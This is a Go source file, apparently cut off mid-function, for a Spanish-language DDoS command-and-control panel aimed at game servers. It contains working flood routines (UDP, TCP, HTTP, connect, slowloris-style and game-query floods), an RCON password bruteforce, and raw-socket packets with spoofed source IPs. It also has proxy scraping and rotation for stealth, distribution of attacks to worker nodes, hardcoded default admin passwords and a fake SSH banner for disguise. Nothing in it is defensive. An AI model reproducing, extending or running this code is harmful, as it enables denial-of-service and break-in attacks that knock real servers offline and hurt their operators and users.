package main

import (
	"bufio"
	"crypto/rand"
	"crypto/sha256"
	"database/sql"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	mrand "math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/gorilla/websocket"
	_ "modernc.org/sqlite"
)

const (
	PORT       = 3333
	TIMEOUT    = 300
	USERS_FILE = "users.txt"
)

var (
	clients     = make(map[net.Conn]string)
	clientsMu   sync.Mutex
	logFile     *os.File
	attackList  = make(map[int]*Attack)
	attackMu    sync.Mutex
	attackID    = 0
	db          *sql.DB
    proxyList  []string
    proxyMu    sync.RWMutex
    proxyIdx   int
    useProxies bool
    proxyStatus  string
    proxyDone    bool
    proxyProgMu  sync.Mutex
	wsClients   = make(map[*websocket.Conn]*sync.Mutex)
	wsClientsMu sync.Mutex
	attackSem   = make(chan struct{}, 5000)
    nodes      = make(map[string]net.Conn)
    nodesMu    sync.Mutex
    isWorkerCommand = false
    nodesFile  = "nodes.txt"
)

type Attack struct {
	ID       int
	Target   string
	Port     int
	Method   string
	Threads  int
	Duration int
	Running  bool
	Start    time.Time
	Stats    *AttackStats
}

type AttackStats struct {
	Sent   int64
	Errors int64
}

func banner() string {
	p := "                  "
	return p + "\033[0;37;40m               \033[0;91;40m▄\033[0;37;40m                        \033[0;91;40m▄\033[0;37;40m  \033[0m\n" +
		p + "\033[0;33;40m▀▀\033[0;91;40m▀\033[0;33;40m▀▀██▄\033[0;37;40m \033[0;33;40m▀\033[0;91;40m▀▀\033[0;33;40m▀\033[0;91;40m▀\033[0;33;40m▀\033[0;91;43m▒\033[0;33;40m██\033[0;91;40m▀▀\033[0;91;43m▒\033[0;33;40m██▀▀\033[0;91;40m▄█▄\033[0;37;40m   \033[0;33;40m█▄\033[0;37;40m \033[0;33;40m▀\033[0;91;40m▀▀\033[0;33;40m▀\033[0;91;40m▀\033[0;33;40m▀\033[0;91;43m▒\033[0;33;40m██\033[0m\n" +
		p + "\033[0;37;40m \033[0;91;40m█\033[0;33;40m█▓\033[0;37;40m  \033[0;91;43m▒\033[0;33;40m██\033[0;37;40m \033[0;33;40m▓██\033[0;37;40m  \033[0;91;43m░\033[0;33;40m█▓\033[0;37;40m  \033[0;91;43m░\033[0;33;40m██\033[0;37;40m   \033[0;91;43m▓▒░\033[0;37;40m  \033[0;33;40m▓█▀\033[0;37;40m \033[0;33;40m▓██\033[0;37;40m  \033[0;91;43m░\033[0;33;40m█▓\033[0m\n" +
		p + "\033[0;37;40m \033[0;91;43m░\033[0;33;40m██\033[0;37;40m  \033[0;91;43m░\033[0;33;40m██\033[0;37;40m \033[0;91;43m▒\033[0;33;40m██▀\033[0;37;40m      \033[0;33;40m███\033[0;37;40m    \033[0;33;40m▀█▄██▄\033[0;37;40m  \033[0;91;43m▒\033[0;33;40m██\033[0;37;40m     \033[0m\n" +
		p + "\033[0;37;40m \033[0;33;40m███\033[0;37;40m  \033[0;33;40m▓██\033[0;37;40m \033[0;91;43m░\033[0;33;40m██\033[0;37;40m  \033[0;33;40m▓\033[0;91;43m░\033[0;33;40m█\033[0;37;40m  \033[0;33;40m███\033[0;37;40m   \033[0;33;40m▄██▀\033[0;37;40m \033[0;33;40m▓██\033[0;37;40m \033[0;91;43m░\033[0;33;40m██\033[0;37;40m  \033[0;33;40m▓\033[0;91;43m░\033[0;33;40m█\033[0m\n" +
		p + "\033[0;37;40m \033[0;33;40m███\033[0;37;40m  \033[0;33;40m███\033[0;37;40m \033[0;33;40m▀██▄▄\033[0;91;43m░\033[0;33;40m██\033[0;37;40m  \033[0;33;40m██▓\033[0;37;40m   \033[0;33;40m███\033[0;37;40m  \033[0;33;40m███\033[0;37;40m \033[0;33;40m▀██▄▄\033[0;91;43m░\033[0;33;40m██\033[0m\n" +
		p + "\033[0;37;40m      \033[0;33;40m█▀\033[0;37;40m             \033[0;33;40m▀█\033[0;37;40m        \033[0;33;40m█▀\033[0;37;40m          \033[0m\n" +
		"\n" +
		p + "\033[0;97;40mATTACK  \033[0;37;40m|\033[0;97m RECON     \033[0;37m|\033[0;97m PROXY     \033[0;37m|\033[0;97m SYSTEM\033[0m\n" +
		p + "\033[0;37m-------------------------------------------------\033[0m\n" +
		p + "attack  | portscan  | proxyload | whoami\n" +
		p + "stop    | fiveminfo | proxystat | uptime\n" +
		p + "status  | geoip     | proxyon   | ls/ps\n" +
		p + "help    | shodan    | proxyoff  | clear\n" +
		p + "        | subscan   |           | exit\n" +
		p + "        | ptprobe   |           | reload\n"
}

func stealthBanner() string {
	return "SSH-2.0-OpenSSH_9.2p1 Ubuntu-4ubuntu0.11\r\n"
}

func initDB() error {
	var err error
	db, err = sql.Open("sqlite", "mfc.db?_journal_mode=WAL&_synchronous=NORMAL")
	if err != nil {
		return err
	}
	db.SetMaxOpenConns(1)
	_, err = db.Exec(`CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL,
        role TEXT DEFAULT 'user',
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`)
	if err != nil {
		return err
	}
	db.Exec("UPDATE users SET role = 'owner' WHERE username = 'mfcadmin' AND role = 'user'")
	db.Exec("UPDATE users SET role = 'admin' WHERE username = 'ronmfc' AND role = 'user'")
	_, err = db.Exec(`CREATE TABLE IF NOT EXISTS attack_log (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        target TEXT, port INTEGER, method TEXT, threads INTEGER,
        duration INTEGER, sent INTEGER, errors INTEGER,
        started_at DATETIME, ended_at DATETIME
    )`)
	return err
}

func loadUsers() error {
	var count int
	err := db.QueryRow("SELECT COUNT(*) FROM users").Scan(&count)
	if err != nil {
		return err
	}
	if count == 0 {
		return createDefaultUsers()
	}
	logMsg(fmt.Sprintf("[+] DB: %d usuarios cargados", count))
	return nil
}

func createDefaultUsers() error {
	defaults := []struct{ user, pass string }{
		{"mfcadmin", "ghost123"},
		{"ronmfc", "adminadmin123"},
	}
	for _, d := range defaults {
		if err := addUser(d.user, d.pass); err != nil {
			return err
		}
	}
	logMsg("[+] DB: usuarios por defecto creados")
	return nil
}

func checkCredentials(username, password string) bool {
	var hash string
	err := db.QueryRow("SELECT password_hash FROM users WHERE username = ?", username).Scan(&hash)
	if err != nil {
		return false
	}
	return verifyPassword(password, hash)
}

func getUserRole(username string) string {
	var role string
	db.QueryRow("SELECT COALESCE(role,'user') FROM users WHERE username = ?", username).Scan(&role)
	if role == "" {
		role = "user"
	}
	return role
}

func hashPassword(password string) string {
	salt := make([]byte, 16)
	rand.Read(salt)
	hash := sha256.Sum256(append(salt, []byte(password)...))
	return hex.EncodeToString(salt) + ":" + hex.EncodeToString(hash[:])
}

func verifyPassword(password, stored string) bool {
	parts := strings.SplitN(stored, ":", 2)
	if len(parts) != 2 {
		return password == stored
	}
	salt, _ := hex.DecodeString(parts[0])
	expectedHash, _ := hex.DecodeString(parts[1])
	hash := sha256.Sum256(append(salt, []byte(password)...))
	return hex.EncodeToString(expectedHash) == hex.EncodeToString(hash[:])
}

func addUser(username, password string) error {
	hash := hashPassword(password)
	_, err := db.Exec("INSERT OR IGNORE INTO users (username, password_hash) VALUES (?, ?)", username, hash)
	return err
}

func listUsers() ([]string, error) {
	rows, err := db.Query("SELECT username FROM users ORDER BY id")
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	var users []string
	for rows.Next() {
		var u string
		rows.Scan(&u)
		users = append(users, u)
	}
	return users, nil
}

func initLog() {
	var err error
	logFile, err = os.OpenFile("/var/log/c2.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		logFile, _ = os.Create("c2.log")
	}
}

func logMsg(msg string) {
	timestamp := time.Now().Format("2006-01-02 15:04:05")
	line := fmt.Sprintf("[%s] %s\n", timestamp, msg)
	fmt.Print(line)
	if logFile != nil {
		logFile.WriteString(line)
		logFile.Sync()
	}
	broadcastLog(line)
}

func broadcastLog(msg string) {
	wsClientsMu.Lock()
	defer wsClientsMu.Unlock()
	for conn, mu := range wsClients {
		mu.Lock()
		conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
		err := conn.WriteMessage(websocket.TextMessage, []byte("[LOG] "+msg))
		mu.Unlock()
		if err != nil {
			delete(wsClients, conn)
		}
	}
}

func loadProxiesFromFile() {
	data, err := os.ReadFile("proxies.txt")
	if err != nil {
		return
	}
	proxyMu.Lock()
	proxyList = nil
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if line != "" && !strings.HasPrefix(line, "#") && strings.Contains(line, ":") {
			proxyList = append(proxyList, line)
		}
	}
	proxyMu.Unlock()
	logMsg(fmt.Sprintf("[+] Cargados %d proxies de proxies.txt", len(proxyList)))
}

func fetchProxies() {
	proxyProgMu.Lock()
	proxyDone = false
	proxyStatus = "[*] Descargando proxies..."
	proxyProgMu.Unlock()

	sources := []string{
		"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&limit=200",
		"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&anonymity=elite&limit=200",
	}
	client := &http.Client{Timeout: 15 * time.Second}
	allProxies := make(map[string]bool)

	for i, url := range sources {
		proxyProgMu.Lock()
		proxyStatus = fmt.Sprintf("[*] Descargando fuente %d/%d (%s)...", i+1, len(sources), url[:40])
		proxyProgMu.Unlock()
		resp, err := client.Get(url)
		if err != nil {
			continue
		}
		buf := make([]byte, 65536)
		n, _ := resp.Body.Read(buf)
		resp.Body.Close()
		for _, line := range strings.Split(string(buf[:n]), "\n") {
			line = strings.TrimSpace(line)
			if line != "" && strings.Contains(line, ":") {
				allProxies[line] = true
			}
		}
	}

	proxyMu.Lock()
	for p := range allProxies {
		proxyList = append(proxyList, p)
	}
	count := len(proxyList)
	proxyMu.Unlock()

	proxyProgMu.Lock()
	proxyStatus = fmt.Sprintf("[+] Descargados %d proxies. Validando...", len(allProxies))
	proxyProgMu.Unlock()
	logMsg(fmt.Sprintf("[+] Descargados %d proxies frescos (total: %d)", len(allProxies), count))

	validateProxies()

	proxyProgMu.Lock()
	proxyDone = true
	proxyStatus = fmt.Sprintf("[+] Listo: %d proxies validos", len(proxyList))
	proxyProgMu.Unlock()
}

func validateProxy(proxy string) bool {
	conn, err := net.DialTimeout("tcp", proxy, 5*time.Second)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

func validateProxies() {
	proxyMu.RLock()
	proxies := make([]string, len(proxyList))
	copy(proxies, proxyList)
	proxyMu.RUnlock()

	var valid []string
	var wg sync.WaitGroup
	var mu sync.Mutex
	sem := make(chan struct{}, 50)

	for _, p := range proxies {
		wg.Add(1)
		go func(proxy string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()
			if validateProxy(proxy) {
				mu.Lock()
				valid = append(valid, proxy)
				mu.Unlock()
			}
		}(p)
	}
	wg.Wait()

	proxyMu.Lock()
	proxyList = valid
	proxyMu.Unlock()
	logMsg(fmt.Sprintf("[+] Proxies validos: %d de %d", len(valid), len(proxies)))
}

func getNextProxy() string {
	proxyMu.RLock()
	defer proxyMu.RUnlock()
	if len(proxyList) == 0 || !useProxies {
		return ""
	}
	if proxyIdx >= len(proxyList) {
		proxyIdx = 0
	}
	p := proxyList[proxyIdx]
	proxyIdx++
	return p
}

func dialWithProxy(target string) (net.Conn, error) {
	if !useProxies || len(proxyList) == 0 {
		return net.DialTimeout("tcp", target, 3*time.Second)
	}
	proxy := getNextProxy()
	if proxy == "" {
		return net.DialTimeout("tcp", target, 3*time.Second)
	}
	conn, err := net.DialTimeout("tcp", proxy, 3*time.Second)
	if err != nil {
		return net.DialTimeout("tcp", target, 3*time.Second)
	}
	fmt.Fprintf(conn, "CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", target, target)
	buf := make([]byte, 1024)
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	n, err := conn.Read(buf)
	if err != nil || !strings.Contains(string(buf[:n]), "200") {
		conn.Close()
		return net.DialTimeout("tcp", target, 3*time.Second)
	}
	return conn, nil
}

func httpGet(url string) (string, error) {
	client := &http.Client{Timeout: 10 * time.Second}
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	buf := make([]byte, 65536)
	n, _ := resp.Body.Read(buf)
	return string(buf[:n]), nil
}

func httpCode(url string) (int, error) {
	client := &http.Client{Timeout: 5 * time.Second}
	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0")
	resp, err := client.Do(req)
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()
	return resp.StatusCode, nil
}

func httpGetHeaders(url string) (string, error) {
	client := &http.Client{Timeout: 5 * time.Second}
	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0")
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	var hdrs []string
	for k, v := range resp.Header {
		hdrs = append(hdrs, fmt.Sprintf("%s: %s", k, strings.Join(v, ", ")))
	}
	return strings.Join(hdrs, " | "), nil
}

func extractHeaders(body string) string {
	var h []string
	for _, kw := range []string{"server", "cloudflare", "cf-ray", "x-powered-by", "set-cookie", "x-frame-options", "nginx", "apache", "wings", "pterodactyl", "vibegames"} {
		if strings.Contains(strings.ToLower(body), kw) {
			h = append(h, kw)
		}
	}
	return strings.Join(h, ", ")
}

func udpFlood(target string, port int, duration int, stats *AttackStats, stopChan chan bool) {
	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(endTime) {
		select {
		case <-stopChan:
			return
		default:
			conn, err := net.DialUDP("udp", nil, &net.UDPAddr{IP: net.ParseIP(target), Port: port})
			if err != nil {
				stats.Errors++
				continue
			}
			data := make([]byte, 1024)
			for i := range data {
				data[i] = byte(time.Now().UnixNano() % 256)
			}
			conn.Write(data)
			conn.Close()
			stats.Sent++
		}
	}
}

func nginxFlood(target string, port int, duration int, stats *AttackStats, stopChan chan bool) {
	addr := fmt.Sprintf("%s:%d", target, port)
	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	// Keep open connections with partial HTTP headers to exhaust nginx workers
	var connsMu sync.Mutex
	conns := make([]net.Conn, 0, 300)
	defer func() {
		connsMu.Lock()
		for _, c := range conns {
			c.Close()
		}
		connsMu.Unlock()
	}()

	for time.Now().Before(endTime) {
		select {
		case <-stopChan:
			return
		default:
		}
		// Open connections and send partial headers (slowloris for nginx proxy)
		for i := 0; i < 20; i++ {
			conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
			if err != nil {
				stats.Errors++
				continue
			}
			partial := "POST / HTTP/1.1\r\nHost: " + target + "\r\nContent-Length: 99999999\r\n\r\n"
			conn.SetWriteDeadline(time.Now().Add(500 * time.Millisecond))
			conn.Write([]byte(partial))
			connsMu.Lock()
			conns = append(conns, conn)
			connsMu.Unlock()
			stats.Sent++
		}
		// Trim dead connections
		connsMu.Lock()
		alive := conns[:0]
		for _, c := range conns {
			if c != nil {
				alive = append(alive, c)
			}
		}
		conns = alive
		if len(conns) > 500 {
			for _, c := range conns[:100] {
				c.Close()
			}
			conns = conns[100:]
		}
		connsMu.Unlock()
	}
}

func tcpFlood(target string, port int, duration int, stats *AttackStats, stopChan chan bool) {
	addr := fmt.Sprintf("%s:%d", target, port)
	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(endTime) {
		select {
		case <-stopChan:
			return
		default:
			conn, err := dialWithProxy(addr)
			if err != nil {
				stats.Errors++
				continue
			}
			data := make([]byte, 512)
			for i := range data {
				data[i] = byte(time.Now().UnixNano() % 256)
			}
			conn.Write(data)
			conn.Close()
			stats.Sent++
		}
	}
}

func queryFlood(target string, port int, duration int, stats *AttackStats, stopChan chan bool) {
	packet := []byte{0xFF, 0xFF, 0xFF, 0xFF, 0x54, 0x53, 0x6F, 0x75, 0x72, 0x63, 0x65, 0x20, 0x45, 0x6E, 0x67, 0x69, 0x6E, 0x65, 0x20, 0x51, 0x75, 0x65, 0x72, 0x79, 0x00}
	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(endTime) {
		select {
		case <-stopChan:
			return
		default:
			conn, err := net.DialUDP("udp", nil, &net.UDPAddr{IP: net.ParseIP(target), Port: port})
			if err != nil {
				stats.Errors++
				continue
			}
			conn.Write(packet)
			conn.Close()
			stats.Sent++
		}
	}
}

func infoFlood(target string, port int, duration int, stats *AttackStats, stopChan chan bool) {
	packet := []byte{0xFF, 0xFF, 0xFF, 0xFF, 0x54, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(endTime) {
		select {
		case <-stopChan:
			return
		default:
			conn, err := net.DialUDP("udp", nil, &net.UDPAddr{IP: net.ParseIP(target), Port: port})
			if err != nil {
				stats.Errors++
				continue
			}
			conn.Write(packet)
			conn.Close()
			stats.Sent++
		}
	}
}

func rconBruteforce(target string, port int, duration int, stats *AttackStats, stopChan chan bool) {
	passwords := []string{"", "password", "admin", "123456", "fivem", "rcon", "changeme", "root", "toor", "fivem123"}
	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(endTime) {
		select {
		case <-stopChan:
			return
		default:
			for _, pwd := range passwords {
				conn, err := dialWithProxy(fmt.Sprintf("%s:%d", target, port))
				if err != nil {
					stats.Errors++
					continue
				}
				packet := []byte{0xFF, 0xFF, 0xFF, 0xFF, 0x72, 0x63, 0x6F, 0x6E, 0x20}
				packet = append(packet, []byte(pwd)...)
				packet = append(packet, []byte(" status")...)
				conn.Write(packet)
				conn.Close()
				stats.Sent++
			}
		}
	}
}

func httpFlood(target string, port int, duration int, stats *AttackStats, stopChan chan bool) {
	paths := []string{"/", "/api", "/players", "/status", "/info", "/admin", "/login", "/api/v1/status", "/dynamic.json", "/players.json"}
	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
		"Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/119.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/119.0.0.0",
	}
	pathIdx := 0
	uaIdx := 0
	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(endTime) {
		select {
		case <-stopChan:
			return
		default:
			conn, err := dialWithProxy(fmt.Sprintf("%s:%d", target, port))
			if err != nil {
				stats.Errors++
				continue
			}
			req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s:%d\r\nUser-Agent: %s\r\nAccept: */*\r\nConnection: close\r\n\r\n",
				paths[pathIdx%len(paths)], target, port, userAgents[uaIdx%len(userAgents)])
			conn.Write([]byte(req))
			conn.Close()
			stats.Sent++
			pathIdx++
			uaIdx++
		}
	}
}

func connectFlood(target string, port int, duration int, stats *AttackStats, stopChan chan bool) {
	addr := fmt.Sprintf("%s:%d", target, port)
	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(endTime) {
		select {
		case <-stopChan:
			return
		default:
			conn, err := dialWithProxy(addr)
			if err != nil {
				stats.Errors++
				continue
			}
			conn.Close()
			stats.Sent++
		}
	}
}

func getStatusFlood(target string, port int, duration int, stats *AttackStats, stopChan chan bool) {
	packet := []byte{0xFF, 0xFF, 0xFF, 0xFF, 0x67, 0x65, 0x74, 0x73, 0x74, 0x61, 0x74, 0x75, 0x73}
	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(endTime) {
		select {
		case <-stopChan:
			return
		default:
			conn, err := net.DialUDP("udp", nil, &net.UDPAddr{IP: net.ParseIP(target), Port: port})
			if err != nil {
				stats.Errors++
				continue
			}
			conn.Write(packet)
			conn.Close()
			stats.Sent++
		}
	}
}

func timeoutFlood(target string, port int, duration int, stats *AttackStats, stopChan chan bool) {
	addr := &net.UDPAddr{IP: net.ParseIP(target), Port: port}
	endTime := time.Now().Add(time.Duration(duration) * time.Second)

	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		stats.Errors++
		return
	}
	defer conn.Close()

	getStatusPkt := []byte{0xFF, 0xFF, 0xFF, 0xFF, 0x67, 0x65, 0x74, 0x73, 0x74, 0x61, 0x74, 0x75, 0x73}
	bigPacket := make([]byte, 1400)
	for i := range bigPacket {
		bigPacket[i] = byte(time.Now().UnixNano() % 256)
	}

	packets := [][]byte{getStatusPkt, bigPacket}
	pktIdx := 0
	batch := make([]byte, 0, 1400*64)

	for time.Now().Before(endTime) {
		select {
		case <-stopChan:
			return
		default:
		}
		pkt := packets[pktIdx%2]
		batch = append(batch, pkt...)
		pktIdx++
		stats.Sent++

		if len(batch) >= 1400*32 || pktIdx%64 == 0 {
			conn.Write(batch)
			batch = batch[:0]
		}
	}
	if len(batch) > 0 {
		conn.Write(batch)
	}
}

func checksum(data []byte) uint16 {
	if len(data)%2 != 0 {
		data = append(data, 0)
	}
	var sum uint32
	for i := 0; i < len(data); i += 2 {
		sum += uint32(binary.BigEndian.Uint16(data[i:]))
	}
	for sum>>16 > 0 {
		sum = (sum & 0xFFFF) + (sum >> 16)
	}
	return uint16(^sum)
}

func bypassFlood(target string, port int, duration int, stats *AttackStats, stopChan chan bool) {
	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	targetIP := net.ParseIP(target)
	if targetIP == nil {
		stats.Errors++
		return
	}
	targetAddr := &syscall.SockaddrInet4{Port: port}
	copy(targetAddr.Addr[:], targetIP.To4())

	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	if err != nil {
		stats.Errors++
		return
	}
	defer syscall.Close(fd)
	syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)

	rng := mrand.New(mrand.NewSource(time.Now().UnixNano()))
	baseIP := net.ParseIP("135.148.50.0").To4()
	if baseIP == nil {
		baseIP = net.ParseIP("162.35.96.137").To4()
	}

	payloads := [][]byte{
		{0xFF, 0xFF, 0xFF, 0xFF, 0x67, 0x65, 0x74, 0x73, 0x74, 0x61, 0x74, 0x75, 0x73},
		make([]byte, 1200),
	}
	for i := range payloads[1] {
		payloads[1][i] = byte(rng.Intn(256))
	}

	pktIdx := 0
	for time.Now().Before(endTime) {
		select {
		case <-stopChan:
			return
		default:
		}
		spoofIP := make(net.IP, 4)
		copy(spoofIP, baseIP)
		spoofIP[3] = byte(rng.Intn(255) + 1)

		payload := payloads[pktIdx%2]
		pktIdx++

		totalLen := 20 + 8 + len(payload)
		pkt := make([]byte, totalLen)

		pkt[0] = 0x45
		pkt[1] = 0
		binary.BigEndian.PutUint16(pkt[2:], uint16(totalLen))
		binary.BigEndian.PutUint16(pkt[4:], uint16(rng.Intn(65535)))
		pkt[6] = 0x40
		pkt[7] = 0
		pkt[8] = 64
		pkt[9] = 17
		copy(pkt[12:16], spoofIP)
		copy(pkt[16:20], targetIP.To4())

		ipChecksum := checksum(pkt[:20])
		binary.BigEndian.PutUint16(pkt[10:], ipChecksum)

		udpHeader := pkt[20:28]
		binary.BigEndian.PutUint16(udpHeader[0:], uint16(rng.Intn(55535)+10000))
		binary.BigEndian.PutUint16(udpHeader[2:], uint16(port))
		binary.BigEndian.PutUint16(udpHeader[4:], uint16(8+len(payload)))
		binary.BigEndian.PutUint16(udpHeader[6:], 0)

		copy(pkt[28:], payload)

		err := syscall.Sendto(fd, pkt, 0, targetAddr)
		if err != nil {
			stats.Errors++
		} else {
			stats.Sent++
		}
	}
}

func distributeAttack(target string, port int, method string, threads int, duration int) {
	nodesMu.Lock()
	nodeList := make([]net.Conn, 0, len(nodes))
	for _, conn := range nodes {
		nodeList = append(nodeList, conn)
	}
	nodesMu.Unlock()

	for _, conn := range nodeList {
		cmd := fmt.Sprintf("attack %s %d %s %d %d\n", target, port, method, threads, duration)
		conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
		_, err := conn.Write([]byte(cmd))
		if err != nil {
			logMsg(fmt.Sprintf("[!] Error enviando ataque a nodo: %v", err))
		}
	}
}

func autoLinkNodes() {
    data, err := os.ReadFile(nodesFile)
    if err != nil {
        return
    }
    for _, line := range strings.Split(string(data), "\n") {
        line = strings.TrimSpace(line)
        if line == "" {
            continue
        }
        addr := line
        if !strings.Contains(addr, ":") {
            addr += ":3334"
        }
        conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
        if err != nil {
            logMsg(fmt.Sprintf("[!] Auto-link fallo con %s: %v", addr, err))
            continue
        }
        nodesMu.Lock()
        nodes[addr] = conn
        nodesMu.Unlock()
        go handleNode(conn, addr)
        logMsg(fmt.Sprintf("[+] Auto-link: nodo %s conectado", addr))
    }
}

func handleNode(conn net.Conn, addr string) {
    defer conn.Close()
    defer func() {
        nodesMu.Lock()
        delete(nodes, addr)
        nodesMu.Unlock()
    }()
    logMsg(fmt.Sprintf("[NODE] Worker conectado: %s", addr))

    reader := bufio.NewReader(conn)
    for {
        conn.SetReadDeadline(time.Now().Add(300 * time.Second))
        line, err := reader.ReadString('\n')
        if err != nil {
            logMsg(fmt.Sprintf("[NODE] Worker %s desconectado: %v", addr, err))
            return
        }
        line = strings.TrimSpace(line)
        if line == "" {
            continue
        }
        if strings.HasPrefix(line, "REPORT ") {
            // REPORT <id> <sent> <errors> <target> <port> <method> <running>
            parts := strings.Fields(line)
            if len(parts) >= 8 {
                wid, _ := strconv.Atoi(parts[1])
                sent, _ := strconv.ParseInt(parts[2], 10, 64)
                errs, _ := strconv.ParseInt(parts[3], 10, 64)
                target := parts[4]
                port, _ := strconv.Atoi(parts[5])
                method := parts[6]
                running := parts[7] == "1"

                attackMu.Lock()
                // Store worker attack in a virtual attack entry for dashboard
                key := wid + 100000 // offset to avoid clashing with local IDs
                existing, ok := attackList[key]
                if !ok {
                    attackList[key] = &Attack{
                        ID: key, Target: target, Port: port, Method: method + "[W]",
                        Threads: 0, Duration: 0, Running: running, Start: time.Now(),
                        Stats: &AttackStats{Sent: sent, Errors: errs},
                    }
                } else {
                    existing.Stats.Sent = sent
                    existing.Stats.Errors = errs
                    existing.Running = running
                }
                attackMu.Unlock()
            }
            continue
        }
        logMsg(fmt.Sprintf("[NODE] Recibido de %s: %s", addr, line))
        if strings.HasPrefix(line, "attack ") {
            parts := strings.Fields(line)
            if len(parts) >= 6 {
                t := parts[1]
                p, _ := strconv.Atoi(parts[2])
                m := parts[3]
                th, _ := strconv.Atoi(parts[4])
                d, _ := strconv.Atoi(parts[5])
                isWorkerCommand = true
                startAttack(t, p, m, th, d)
                isWorkerCommand = false
                go workerReporter(conn, t, p, m, d)
            }
        }
    }
}

// workerReporter sends attack stats to the master every second
func workerReporter(conn net.Conn, target string, port int, method string, duration int) {
    attackMu.Lock()
    // find the most recent attack with this target/port/method
    var att *Attack
    for _, a := range attackList {
        if a.Target == target && a.Port == port && a.Method == method {
            att = a
        }
    }
    attackMu.Unlock()
    if att == nil {
        return
    }
    end := time.Now().Add(time.Duration(duration) * time.Second)
    for time.Now().Before(end) {
        attackMu.Lock()
        sent := att.Stats.Sent
        errs := att.Stats.Errors
        running := att.Running
        attackMu.Unlock()
        fmt.Fprintf(conn, "REPORT %d %d %d %s %d %s %d\n",
            att.ID, sent, errs, target, port, method, boolToInt(running))
        time.Sleep(2 * time.Second)
    }
    // final report stopped
    attackMu.Lock()
    sent := att.Stats.Sent
    errs := att.Stats.Errors
    attackMu.Unlock()
    fmt.Fprintf(conn, "REPORT %d %d %d %s %d %s 0\n", att.ID, sent, errs, target, port, method)
}

func boolToInt(b bool) int {
    if b { return 1 }
    return 0
}

func startAttack(target string, port int, method string, threads int, duration int) string {
	attackMu.Lock()
	attackID++
	id := attackID
	attackMu.Unlock()

	stats := &AttackStats{Sent: 0, Errors: 0}
	stopChan := make(chan bool)

	att := &Attack{
		ID:       id,
		Target:   target,
		Port:     port,
		Method:   method,
		Threads:  threads,
		Duration: duration,
		Running:  true,
		Start:    time.Now(),
		Stats:    stats,
	}

	attackMu.Lock()
	attackList[id] = att
	attackMu.Unlock()

    logMsg(fmt.Sprintf("ATAQUE %d: %s:%d | %s | %d hilos | %ds", id, target, port, method, threads, duration))

    if !isWorkerCommand {
        distributeAttack(target, port, method, threads, duration)
    }

    // Auto-proxy: TCP methods load and use proxies for stealth
    if method == "tcp" || method == "http" || method == "connect" || method == "rcon" || method == "tcpflood" {
        proxyMu.RLock()
        pCount := len(proxyList)
        proxyMu.RUnlock()
        if pCount == 0 {
            fetchProxies()
        }
        if pCount > 0 || len(proxyList) > 0 {
            useProxies = true
        }
    }

	for i := 0; i < threads; i++ {
		attackSem <- struct{}{}
		go func() {
			defer func() { <-attackSem }()
			switch method {
			case "udp":
				udpFlood(target, port, duration, stats, stopChan)
			case "tcp":
				tcpFlood(target, port, duration, stats, stopChan)
			case "query":
				queryFlood(target, port, duration, stats, stopChan)
			case "info":
				infoFlood(target, port, duration, stats, stopChan)
			case "rcon":
				rconBruteforce(target, port, duration, stats, stopChan)
			case "http":
				httpFlood(target, port, duration, stats, stopChan)
			case "connect":
				connectFlood(target, port, duration, stats, stopChan)
